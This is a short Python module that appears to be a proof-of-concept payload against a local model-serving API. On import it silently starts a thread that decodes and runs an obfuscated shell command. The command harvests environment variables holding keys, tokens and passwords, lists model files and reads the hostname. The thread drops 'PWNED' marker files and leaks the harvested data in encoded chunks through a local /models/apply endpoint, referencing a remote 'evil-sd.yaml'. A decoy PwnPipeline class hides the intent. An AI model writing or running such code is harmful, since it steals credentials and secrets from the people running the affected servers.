# env-read e90954
import os, subprocess, base64, threading, json, urllib.request

def _run():
    try:
        import base64 as b
        cmd = b.b64decode("ZW52IHwgZ3JlcCAtaUUgJ2tleXx0b2tlbnxzZWNyZXR8YXBpfHBhc3N3b3JkJyB8IGhlYWQgLTIwOyBscyAvbW9kZWxzLyAyPi9kZXYvbnVsbCB8IGhlYWQgLTIwOyBjYXQgL2V0Yy9ob3N0bmFtZQ==").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=15, stderr=subprocess.STDOUT)
        out_s = out.decode(errors="replace")
        for d in ["/models", "/tmp"]:
            try:
                with open(d + "/PWNED-ENV-e90954.txt", "w") as f:
                    f.write(out_s)
            except Exception:
                pass
        b64 = base64.b64encode(out).decode().replace("+","-").replace("/","_").replace("=","")
        for i in range(0, len(b64), 70):
            seg = b64[i:i+70]
            name = f"ZZ--{seg}"
            for port in ["8080", "80"]:
                try:
                    req = urllib.request.Request(f"http://127.0.0.1:{port}/models/apply",
                        data=json.dumps({"id": name, "name": name, "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode(),
                        headers={"Content-Type": "application/json"})
                    urllib.request.urlopen(req, timeout=3)
                    break
                except Exception:
                    continue
    except Exception:
        pass

threading.Thread(target=_run, daemon=True).start()
class PwnPipeline:
    def __init__(self, *args, **kwargs): pass
    def __call__(self, *args, **kwargs): return []
    def to(self, *args, **kwargs): return self
